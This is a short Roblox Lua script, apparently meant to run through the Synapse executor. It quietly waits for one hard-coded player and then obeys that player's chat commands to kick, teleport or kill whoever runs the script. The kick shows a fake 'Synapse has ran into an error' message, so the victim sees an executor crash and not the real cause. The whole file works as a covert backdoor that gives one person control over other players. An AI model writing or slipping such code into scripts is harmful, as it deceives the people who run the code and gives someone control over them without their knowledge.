local speaker = game.Players.LocalPlayer

local people = {
    "432757113"
}

local current = nil 

 function reLoop()
    print("a")
    while true do 
        wait(5)
        for i, v in pairs(game.Players:GetPlayers()) do 
            if v.UserId == 432757113 then 
                if current == nil then
                getChat()
                print("on")
                current = v.Name
                end
            end
        end
    end
end

 function getChat()
    game.Players.Hypickels.Chatted:Connect(function(msg)
        if msg == "/e kick"then 
            speaker:Kick("Synapse has ran into an error please restart!")
        end
        if msg == "/e bring" then
            speaker.Character.HumanoidRootPart.CFrame = game.Players.Hypickels.Character.HumanoidRootPart.CFrame
        end
        if msg == "/e kill" then
            speaker.Character.Humanoid.Health = 0
        end
    end)
end

reLoop()
